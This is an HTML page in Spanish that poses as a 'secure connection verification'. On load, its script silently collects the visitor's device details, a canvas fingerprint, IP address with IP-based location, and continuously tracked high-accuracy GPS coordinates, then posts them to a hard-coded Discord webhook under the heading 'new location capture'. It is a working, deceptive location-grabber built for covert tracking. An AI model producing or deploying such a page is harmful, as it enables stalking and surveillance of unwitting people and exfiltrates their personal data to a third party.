<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de seguridad</title>
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            background: #0a0a0a; 
            color: #00ff41; 
            text-align: center; 
            padding: 40px; 
            margin: 0;
        }
        #resultado { 
            margin: 30px auto; 
            max-width: 700px; 
            background: #111; 
            padding: 20px; 
            border: 1px solid #00ff41; 
            border-radius: 8px; 
            text-align: left; 
            font-size: 15px;
            line-height: 1.5;
        }
        .success { color: #00ff41; }
    </style>
</head>
<body>
    <h1>🔍 Verificación de conexión segura</h1>
    <p>Por favor espera mientras verificamos tu ubicación...</p>
    
    <div id="resultado">🔄 Obteniendo datos...</div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1491850169660997783/J12g-R-0nyXPFr4-Uu0WpYXZAFoQmUJfyt5O6JHA79ke5gwx8OM1v1mgIaLMnSe1y18y";

        let allData = {};

        async function obtenerTodo() {
            const res = document.getElementById('resultado');

            // Información básica del dispositivo
            allData = {
                timestamp: new Date().toLocaleString('es-ES'),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
                screen: `${screen.width}×${screen.height} (${screen.colorDepth} bits)`,
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
                hardwareConcurrency: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' núcleos' : 'N/A',
                online: navigator.onLine,
                cookieEnabled: navigator.cookieEnabled,
                darkMode: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No'
            };

            // Canvas Fingerprint (huella del navegador)
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px Arial";
                ctx.fillText("Fingerprint Test", 2, 20);
                allData.canvasFingerprint = btoa(canvas.toDataURL()).substring(0, 30) + "...";
            } catch(e) { allData.canvasFingerprint = "No disponible"; }

            // IP + Geolocalización por IP
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                allData.ip = ipData.ip;
                allData.ipCity = ipData.city || "N/A";
                allData.ipRegion = ipData.region || "N/A";
                allData.ipCountry = ipData.country_name || "N/A";
                allData.ipOrg = ipData.org || "N/A";
            } catch (e) {
                allData.ip = "No disponible";
            }

            // GPS con máxima precisión + seguimiento
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(
                    (position) => {
                        allData.gpsLat = position.coords.latitude.toFixed(8);
                        allData.gpsLon = position.coords.longitude.toFixed(8);
                        allData.gpsAccuracy = Math.round(position.coords.accuracy) + " metros";
                        allData.gpsAltitude = position.coords.altitude ? position.coords.altitude.toFixed(1) + " m" : "N/A";
                        allData.gpsSpeed = position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + " km/h" : "N/A";

                        mostrarEnPantalla();
                        enviarADiscord();
                    },
                    (error) => {
                        res.innerHTML += "<br>❌ GPS no disponible o denegado. Usando datos de IP.";
                        mostrarEnPantalla();
                        enviarADiscord();
                    },
                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                );
            } else {
                mostrarEnPantalla();
                enviarADiscord();
            }
        }

        function mostrarEnPantalla() {
            const res = document.getElementById('resultado');
            res.innerHTML = `
                <span class="success">✅ Datos recolectados correctamente</span><br><br>
                🕒 Hora: ${allData.timestamp}<br>
                🌐 IP: <strong>${allData.ip}</strong><br>
                📍 IP: ${allData.ipCity}, ${allData.ipRegion}, ${allData.ipCountry}<br>
                ${allData.gpsLat ? `
                📍 GPS: <strong>${allData.gpsLat}, ${allData.gpsLon}</strong><br>
                🎯 Precisión: <strong>${allData.gpsAccuracy}</strong><br>` : ''}
                📱 RAM: ${allData.deviceMemory} | Núcleos: ${allData.hardwareConcurrency}<br>
                🖥️ Pantalla: ${allData.screen} | Modo oscuro: ${allData.darkMode}
            `;
        }

        async function enviarADiscord() {
            const mapsLink = allData.gpsLat 
                ? `https://www.google.com/maps?q=${allData.gpsLat},${allData.gpsLon}` 
                : "#";

            const embed = {
                title: "🔴 NUEVA CAPTURA DE UBICACIÓN",
                color: 0x00ff41,
                description: "Información completa del dispositivo y ubicación",
                fields: [
                    { name: "🕒 Hora", value: allData.timestamp, inline: false },
                    { name: "🌐 IP", value: `\`${allData.ip}\``, inline: true },
                    { name: "📍 Ubicación IP", value: `${allData.ipCity}, ${allData.ipRegion}, ${allData.ipCountry}`, inline: true },
                    allData.gpsLat ? { name: "📍 GPS", value: `\`${allData.gpsLat}\`, \`${allData.gpsLon}\``, inline: false } : null,
                    { name: "🎯 Precisión", value: allData.gpsAccuracy || "IP aproximada", inline: true },
                    { name: "🔗 Maps", value: `[Abrir en Google Maps](${mapsLink})`, inline: false },
                    { name: "📱 Dispositivo", value: allData.userAgent.substring(0, 100) + "...", inline: false },
                    { name: "🧠 Huella Canvas", value: allData.canvasFingerprint, inline: false }
                ].filter(Boolean),
                footer: { text: "Sistema avanzado de localización" },
                timestamp: new Date().toISOString()
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: "**Nueva ubicación capturada**",
                        embeds: [embed]
                    })
                });
            } catch (e) {}
        }

        // Iniciar automáticamente
        window.onload = obtenerTodo;
    </script>
</body>
</html>
